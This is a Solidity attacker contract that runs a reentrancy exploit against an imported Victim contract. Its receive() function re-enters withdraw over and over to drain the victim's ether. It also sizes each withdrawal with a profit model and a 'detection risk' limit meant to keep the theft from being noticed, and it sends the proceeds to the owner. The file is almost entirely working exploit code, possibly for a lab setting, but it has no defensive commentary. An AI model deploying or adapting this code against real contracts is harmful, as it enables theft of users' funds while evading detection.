// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract Attacker {
    // Core contract variables
    Victim public victim;
    address public owner;
    uint public reentryCount = 0;
    uint public maxReentry;
    bool public firstWithdrawal = true;

    // Model parameters
    uint public constant BASE_GAS = 21000;      // Base transaction gas
    uint public constant CALL_GAS = 9000;       // Gas per recursive call
    uint public constant SCALE = 1e18;          // Scaling factor for fixed-point math
    uint public alpha;                          // Detection risk rate per call
    uint public delta;                          // Maximum tolerated detection probability
    uint public gasPrice;                       // Current gas price in wei

    // Attack metrics
    uint public totalGasUsed;
    uint public estimatedProfit;
    uint public detectionRisk;

    struct AttackParams {
        uint optimalAmount;      // Optimal amount per withdrawal (a*)
        uint optimalCalls;       // Optimal number of calls (n*)
        uint expectedProfit;     // Expected profit (Π)
        uint detectionRisk;      // P_det
        uint gasRequired;        // Total gas required
    }

    constructor(
        address _victim, 
        uint _maxReentry,
        uint _alpha,
        uint _delta,
        uint _gasPrice
    ) payable {
        victim = Victim(_victim);
        owner = msg.sender;
        maxReentry = _maxReentry;
        alpha = _alpha;
        delta = _delta;
        gasPrice = _gasPrice;
    }

    function calculateGasLimit(uint n) public pure returns (uint) {
        return BASE_GAS + (n * CALL_GAS);
    }

    function calculateDetectionRisk(uint n) public view returns (uint) {
        return SCALE - exponentialDecay(alpha * n);
    }

    function exponentialDecay(uint x) internal pure returns (uint) {
        if (x == 0) return SCALE;
        if (x >= SCALE) return 0;
        
        uint result = SCALE;
        uint term = SCALE;
        
        for (uint i = 1; i <= 4; i++) {
            term = (term * x) / (i * SCALE);
            if (i % 2 == 1) {
                if (term > result) return 0;
                result -= term;
            } else {
                result += term;
            }
        }
        return result;
    }

    function optimizeAttack(uint victimBalance) public view returns (AttackParams memory) {
        AttackParams memory params;
        int256 maxProfit = -1;  // Use int256 to handle negative profits

        // Calculate maximum number of calls based on gas and risk
        uint n_gas = gasleft() / calculateGasLimit(1);
        uint n_risk = maxReentry;  // Start with max reentry as upper bound
        
        // Adjust n_risk based on detection probability
        if (delta < SCALE) {
            uint inverse_term = (SCALE * SCALE) / (SCALE - delta);
            uint calculated_risk = (log1p(inverse_term - SCALE) * SCALE) / alpha;
            if (calculated_risk < n_risk) {
                n_risk = calculated_risk;
            }
        }

        // Find optimal withdrawal amount and number of calls
        uint maxCalls = min3(n_gas, n_risk, 6);  // Cap at 6 calls maximum
        
        // Try different withdrawal amounts
        for (uint i = 1; i <= 5; i++) {  // Try 5 different fractions of the balance
            uint amount = (victimBalance * i) / 5;  // From 20% to 100% of balance
            
            // Calculate maximum calls possible with this amount
            uint n_balance = victimBalance / amount;
            uint n = min3(n_balance, maxCalls, maxReentry);
            
            if (n == 0) continue;

            // Calculate total gas cost
            uint gasRequired = calculateGasLimit(n);
            uint totalGasCost = gasPrice * gasRequired;

            // Calculate potential profit
            if (amount <= totalGasCost) continue;
            
            int256 profit = int256(n * amount) - int256(totalGasCost);
            
            if (profit > maxProfit) {
                maxProfit = profit;
                params.optimalAmount = amount;
                params.optimalCalls = n;
                params.expectedProfit = uint256(profit);
                params.detectionRisk = calculateDetectionRisk(n);
                params.gasRequired = gasRequired;
            }
        }
        
        return params;
    }

    function min3(uint a, uint b, uint c) internal pure returns (uint) {
        return a < b ? (a < c ? a : c) : (b < c ? b : c);
    }

    function log1p(uint x) internal pure returns (uint) {
        require(x <= SCALE, "Input too large");
        
        uint result = 0;
        uint term = x;
        uint divisor = SCALE;
        
        for (uint i = 1; i <= 4; i++) {
            result += term / (i * divisor);
            term = (term * x) / SCALE;
        }
        return result;
    }

    receive() external payable {
        if (firstWithdrawal) {
            firstWithdrawal = false;
            return;
        }

        reentryCount++;
        if (reentryCount < maxReentry) {
            uint gasStart = gasleft();
            
            AttackParams memory params = optimizeAttack(address(victim).balance);
            
            if (params.expectedProfit > 0 && params.detectionRisk <= delta) {
                victim.withdraw(params.optimalAmount);
            }
            
            totalGasUsed += gasStart - gasleft();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        uint gasStart = gasleft();
        
        AttackParams memory params = optimizeAttack(address(victim).balance);
        
        require(params.expectedProfit > 0, "Attack not profitable");
        require(params.detectionRisk <= delta, "Detection risk too high");
        
        victim.deposit{value: msg.value}();
        victim.withdraw(params.optimalAmount);
        
        totalGasUsed = gasStart - gasleft();
        estimatedProfit = params.expectedProfit;
        detectionRisk = params.detectionRisk;
    }

    function withdrawProfit() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
